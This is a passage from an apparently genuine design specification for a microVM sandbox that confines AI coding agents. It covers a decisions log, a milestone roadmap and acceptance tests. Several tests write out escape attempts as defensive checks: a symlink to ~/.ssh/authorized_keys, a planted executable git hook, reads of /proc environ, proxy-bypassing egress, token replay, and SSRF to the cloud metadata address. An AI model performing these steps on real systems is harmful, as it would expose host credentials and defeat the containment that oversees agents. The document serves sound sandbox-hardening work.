- **The contradiction:** The current repository directory `/Users/malshayeb/Documents/git-reps/Planes/Airlock ` contains a **trailing ASCII space (`0x20`)**. Unquoted `Makefile` recipes, shell wrappers, `cargo`/`docker` bind paths, and Windows clones break or behave unpredictably on paths with trailing spaces.
- **Adopted resolution (`D-10`):**
  1. Initialize `.git` in place during scaffolding and queue renaming `/Users/malshayeb/Documents/git-reps/Planes/Airlock ` → `/Users/malshayeb/Documents/git-reps/Planes/Airlock` immediately upon session close (`D-10`).
  2. Independently retain `FR-FS-8` / `AT-14` in the Airlock test suite so `airlockd`, `mkfs.erofs`, `clonefile(2)`, and `airlock-vz-helper` safely handle *customer* directories containing spaces.

---

## 13. Signed-Off Decisions Log

All Phase 1 decisions (**D-1** through **D-10**) were formally signed off on `2026-11-20` adopting the recommended engineering defaults below.

| ID | Decision | Adopted Default | Status | Proposed Owner | Affected Scope |
|---|---|---|---|---|---|
| **D-1** | Permit `Seatbelt`/`Landlock` host fallback in Phase 1 (`C1`), or enforce microVM-only + warm pool? | **MicroVM-only + warm pool of 1 idle VM.** Reject OS-level fallback in Phase 1 due to `vsock` & kernel-isolation invariants. | `SIGNED OFF (2026-11-20)` | Security + Eng Lead | `FR-VM-1`, `FR-NET-1`, `C1` |
| **D-2** | Strategy for `.env` files and client-side signing protocols like AWS SigV4 / DB SCRAM (`C2`)? | Strip `.env*`; synthesize non-secret defaults from `.env.example` + phantom HTTP/Git tokens; add AWS SigV4 broker re-signer in `M2`; fail fast on raw DB/HMAC secrets unless test creds provided. | `SIGNED OFF (2026-11-20)` | Eng Lead + DX | `FR-FS-2`, `FR-FS-4`, `C2` |
| **D-3** | Default TLS posture at `airlock-broker` (`C3`)? | Ephemeral per-VM CA L7 termination for all credential-injected & write-capable domains; opt-in `sni_passthrough` restricted to read-only public CDNs. | `SIGNED OFF (2026-11-20)` | Security + Eng | `FR-BRK-4`, `FR-BRK-9`, `C3` |
| **D-4** | Default package-registry access in `airlock init` (`C4`)? | Allow `GET`/`HEAD` (query-stripped) to stack-matched registries (`npmjs`, `pypi`, `crates.io`) in `standard`; supply `--offline` profile for sensitive repos. | `SIGNED OFF (2026-11-20)` | Product + Security | `UX-1`, `C4` |
| `D-5` | Default Commit Gate interactivity (`C5`)? | Interactive confirmation on CLI (`commit` / `run`); optional `--auto-commit-safe` flag permitted only when `0` protected paths, `0` secret matches, and `0` host conflicts. | `SIGNED OFF (2026-11-20)` | DX + Security | `FR-CMT-6`, `UX-9` |
| `D-6` | Remote Linux pool CPU architecture baseline (`C6`)? | Publish reproducible dual-arch guest images (`aarch64` for AWS Graviton parity with Mac + `x86_64`). | `SIGNED OFF (2026-11-20)` | Infra Lead | `§4`, `C6` |
| `D-7` | Audit HTTP body capture & retention (`C7`)? | Structural hash-chained `audit.jsonl` retained `30` days; `capture_http_bodies = false` by default. | `SIGNED OFF (2026-11-20)` | Security + Legal | `FR-AUD-1`, `C7` |
| `D-8` | Core implementation language stack? | Rust workspace (`airlockd`, `airlock-broker`, `airlock-guestd`, `airlock-cli`) + minimal Swift helper (`macos/airlock-vz-helper`). | `SIGNED OFF (2026-11-20)` | Eng Lead | `§7.2` |
| `D-9` | Include container engine in default rootfs? | Ship lightweight `standard` rootfs (~120 MiB) for fast boot + optional `containers` rootfs (~450 MiB) with rootless Podman. | `SIGNED OFF (2026-11-20)` | Eng + Product | `FR-VM-8` |
| `D-10` | Rename workspace folder `Airlock ` -> `Airlock` (`C9`) & clear trademark? | `.git` initialized in place; folder rename `Airlock ` -> `Airlock` queued for post-session close; legal trademark/domain clearance prior to public release. | `SIGNED OFF (2026-11-20)` | Repo Owner + Legal | Repo setup, §11.3 |

---

## 14. Delivery Roadmap (Phase 0 Spikes & Phase 1 Milestones)

| Milestone | Duration | Core Deliverables | Exit Criteria |
|---|---|---|---|
| **M0: Phase 0 Technical Spikes** | `2 wks` | Benchmark Firecracker `mkfs.erofs` vs `dm-thin` build times on 10k-file & 100k-file repos; prototype Swift `Virtualization.framework` `vsock` + `virtio-fs` bridge; verify `tun0` + proxy capture inside Linux 6.12 guest; lock **D-1..D-4**. | Spike metrics meet warm-boot & `vsock` latency envelopes; `D-1`..`D-4` signed off. |
| **M1: Linux Firecracker + `vsock` + EROFS/OverlayFS Core** | `3 wks` | `airlockd`, `airlock-vmm` (`firecracker` + `jailer`), `airlock-guestd` (`overlayfs`, `tun0`, `exec` RPC), warm pool manager, crash recovery reaper. | `AT-1`, `AT-2`, `AT-3`, `AT-9` (Linux), `AT-10` pass. |
| **M2: Secretless Capability Broker + Phantom Tokens + Git Guard** | `3 wks` | `airlock-broker`, ephemeral CA, `hyper`/`rustls` L7 proxy, HMAC CID-bound phantom tokens, Keychain/vault/GitHub App providers, Git pkt-line inspector, SSRF IP guard, rate/spend caps. | `AT-4`, `AT-5`, `AT-6`, `AT-12` pass; zero smuggling on test harness. |
| **M3: macOS Apple Silicon `Virtualization.framework` Backend** | `2 wks` | `macos/airlock-vz-helper` (Hardened Runtime + entitlement), APFS `clonefile(2)` scrubber, `VZVirtioFileSystemDeviceConfiguration` + `vsock` bridge, `airlock doctor` macOS checks. | Full parity of `AT-1`..`AT-10` on Apple Silicon macOS 14/15. |
| **M4: Atomic Commit Gate, Audit Chain, CLI & Python/TS SDKs** | `2 wks` | Path/symlink/hook/secret Commit Gate, 3-way host digest check, write-ahead `undo` journal, hash-chained `audit.jsonl`, `airlock` CLI/TUI, `airlock-sdk` (Python), `@airlock/sdk` (TS), harness adapters. | `AT-7`, `AT-8`, `AT-11`, `AT-13`, `AT-14` pass. |
| **M5: Red-Team Pen-Test, WCAG/CLI Audit & GA Readiness** | `2 wks` | External/internal red-team against `T1`–`T10`, SLSA L3 reproducible image pipeline, `clig.dev` & WCAG 2.2 AA accessibility audit, documentation & remote bare-metal soak test (`50` concurrent VMs). | Zero open Critical/High pen-test findings; all `§2.3` targets & `AT-1`..`AT-14` green. |

**Post-Phase 1 Handoff:**
- **Phase 2 (Tool & MCP Isolation):** Plug per-MCP isolated Wasm/micro-container spokes into the `principal_id` TLV seam (§7.5) and introduce Wasmtime/V8 API isolates.
- **Phase 3 (Semantic IFC + Kernel Taint):** Wire guest kernel eBPF LSM file/process tainting into `taint_labels` over `vsock` and connect CaMeL/FIDES planner rules at `airlock-broker` to close `C4` / `T2`.

---

## 15. Acceptance & Verification Matrix

| ID | Verification Scenario | Pass Criteria |
|---|---|---|
| **`AT-1`** | **Host `$HOME` Isolation:** Inside chamber, enumerate `/`, `/Users`, `/home`, `mount`, and `/proc/*/environ`. | Zero host directories, SSH keys, or host user variables outside scrubbed `/workspace` appear. |
| **`AT-2`** | **`.env` & Repo Secret Scrubbing:** Place `.env` (`OPENAI_API_KEY=sk-real-test123`) and PAT-embedded `.git/config` in host repo; boot chamber and scan raw `/dev/vdb` / `virtio-fs` blocks. | Neither credential substring exists anywhere in guest RAM, filesystem, or block device bytes. |
| **`AT-3`** | **Zero `virtio-net` & Fail-Closed Egress:** Inspect `ip link`; attempt raw UDP packet to `8.8.8.8:53` and direct TCP `connect()` to `1.1.1.1:443` bypassing `HTTP_PROXY`. | `virtio-net` absent; unauthorized TCP/UDP drops/rejects cleanly and logs `[BLOCKED]` in `audit.jsonl`. |
| **`AT-4`** | **Phantom Token Binding & Replay Rejection:** Extract `GITHUB_TOKEN=airlock-phantom:...` from guest; replay it from host `curl` and from a second running chamber (`CID=8`). | Both replays fail with `403 CAPABILITY_REPLAY_DETECTED`; real token never enters guest RAM. |
| **`AT-5`** | **Branch-Scoped Git Push Enforcement:** With `allowed_branches = ["refs/heads/agent/*"]`, push `agent/fix-1` (must succeed), then push `main` and `git push --force origin agent/fix-1`. | `agent/fix-1` fast-forward succeeds; `main` and `--force` are blocked at pkt-line parser before packfile upload. |
| **`AT-6`** | **DNS Rebinding & Cloud IMDS SSRF Defense:** Point an allowlisted test domain sequentially to `127.0.0.1` and `169.254.169.254`. | Broker rejects both post-resolution with SSRF block error and never opens socket to local/IMDS IP. |
| **`AT-7`** | **Malicious `.git/hooks` & Symlink Escape Block:** Inside guest create `.git/hooks/post-checkout` (`chmod +x`) and `ln -s /Users/dev/.ssh/authorized_keys escape.txt`; run `airlock commit`. | Commit Gate hard-blocks `escape.txt` symlink escape and flags `.git/hooks/post-checkout` `[REVIEW]` / blocked. |
| **`AT-8`** | **3-Way Host Conflict & Atomic `undo`:** Modify `src/lib.rs` simultaneously on host and in chamber; verify conflict pause. Commit clean batch, then run `airlock undo <id>`. | Conflict pauses safely without overwrite; `undo` restores byte-identical pre-commit host files. |
| **`AT-9`** | **Warm-Pool Acquisition Latency:** Run `50` sequential `airlock run -- true` iterations on Linux KVM and macOS Apple Silicon. | p50 ≤ `120 ms`, p95 ≤ `250 ms` on both platforms. |
| **`AT-10`** | **Crash / `SIGKILL` Reaper Verification:** Start `5` active chambers, `kill -9` `airlockd`, then restart `airlockd`. | 100% of orphan VMMs, sockets, EROFS files, and APFS clones cleaned within `5 s`. |
| **`AT-11`** | **Audit Hash-Chain & Zero-Secret Integrity:** Execute `100` proxied API calls with real test keys; tamper line `42` of `audit.jsonl`. | `airlock logs --verify` catches tamper on line `42`; `grep` finds `0` real key substrings in logs. |
| **`AT-12`** | **L7 CA vs Cert-Pinned Passthrough:** Verify `curl`, `python-requests`, `node`, and `git` trust ephemeral CA on L7 endpoints; verify SPKI-pinned test client succeeds on opt-in `sni_passthrough` domain with zero credential injection. | Both modes operate as specified without disabling certificate checks in guest code. |
| **`AT-13`** | **CLI Ergonomics & WCAG 2.2 AA Accessibility:** Audit Commit Gate TUI & denial errors under `NO_COLOR=1`, `TERM=dumb`, light/dark themes, keyboard-only navigation, and `--plain`. | Contrast ≥ 4.5:1 verified; all states dual-coded (`[SEALED]`/`[BLOCKED]`); full keyboard & `--plain` parity. |
| **`AT-14`** | **Workspace Path With Spaces Hygiene:** Run `init -> run -> diff -> commit -> undo` inside `/tmp/Airlock Test /repo `. | Zero quoting/path errors across `airlockd`, `clonefile`/`mkfs.erofs`, and `airlock-vz-helper`. |
